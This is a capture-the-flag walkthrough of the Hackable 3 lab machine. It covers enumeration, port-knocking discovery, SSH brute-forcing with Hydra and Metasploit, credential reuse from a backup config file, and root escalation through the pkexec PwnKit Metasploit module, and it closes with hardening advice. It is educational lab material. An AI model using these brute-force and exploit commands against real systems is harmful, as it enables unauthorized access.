#  Hackable 3 CTF – Summary Walkthrough  

A full text-based breakdown of the Hackable 3 vulnerable machine. This box demonstrates port knocking, multi-layered credential discovery, and privilege escalation via the pkexec vulnerability.  

##  Discovery  
- Ran initial scans:  
nmap -sV -Pn <ip>
nmap -A <ip>

- Found ports:  
- 80 (HTTP – Apache)  
- 22 (SSH – filtered)  

💡 SSH appeared filtered, suggesting firewall restrictions or a port-knocking requirement.  

##  Enumeration  
- Ran `gobuster` on HTTP service:  
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt -x jpg,html,php,bak,zip,log

- Discovered multiple paths:  
- `/files`  
- `/3.jpg`  
- `/backup`  
- `/config.php`  
- `/css`  
- `/home.html`  
- `/imagens`  
- `/login.php`  
- `/robots.txt`  

✅ Source code of main page revealed **username hint** (`jubiscleudo`) and port-knocking sequence clues.  

##  Foothold  
- Extracted knock sequence from hidden files:  
- `/config/1.txt` → Base64 encoded  
- `/css/2.txt` → Brainfuck encoded (decoded online)  
- `/3.jpg` → Hidden data extracted with `steghide`  

- Executed knock sequence:  
knock <ip> <port1> <port2> <port3>

→ Opened port 22 (SSH).  

- Brute-forced SSH with Hydra:  
hydra -l jubiscleudo -P wordlist.txt ssh://<ip>

- Alternatively, automated login with Metasploit:  
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <ip>
set USERNAME jubiscleudo
set PASSWORD <found-password>
run

✅ Gained SSH access as `jubiscleudo`.  

##  User Escalation (jubiscleudo → hackable_3)  
- Found credentials in `.backup_config.php`:  
cat /var/www/html/.backup_config.php

- Switched user:  
su hackable_3

✅ Access as user `hackable_3`.  

##  Privilege Escalation (hackable_3 → root)  
- Searched for SUID binaries:  
find / -perm -4000 -type f 2>/dev/null

- Found vulnerable **pkexec** binary (Polkit).  

- Upgraded shell to Meterpreter:  
sessions -u <id>

- Used Metasploit exploit:  
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <meterpreter-id>
run

✅ Root shell obtained. 🎉  

---

## 🛡 Recommendations  
- **Restrict SSH Access:**  
Configure `/etc/ssh/sshd_config`:  
PermitRootLogin no
PasswordAuthentication no

- **Avoid Storing Credentials in Code:**  
Never place sensitive data (e.g., `.backup_config.php`) in web-accessible directories.  

- **Patch Vulnerable Binaries:**  
Update Polkit to address `pkexec` vulnerability:  
sudo apt update && sudo apt upgrade polkit

Regularly check for updates:  
sudo apt list --upgradable

---

📖 **Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/hackable-3-ctf-full-technical-walkthrough-5d4d35b44562)
